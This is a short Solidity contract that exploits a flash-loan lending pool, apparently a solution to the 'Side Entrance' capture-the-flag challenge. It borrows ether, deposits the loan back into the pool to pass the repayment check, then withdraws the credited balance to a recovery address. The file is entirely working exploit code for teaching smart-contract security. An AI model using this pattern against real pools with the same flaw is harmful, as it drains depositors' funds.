pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    address public recovery;
    SideEntranceLenderPool public lenderPool;

    constructor(address recovery_, address lenderPool_) {
        recovery = recovery_;
        lenderPool = SideEntranceLenderPool(lenderPool_);
    }

    function attack(uint256 amount) external {
        lenderPool.flashLoan(amount);
    }
    function execute() public payable {
        lenderPool.deposit{value: msg.value}();
    }
    function withdraw() external {
        lenderPool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }
    receive() external payable {}
}
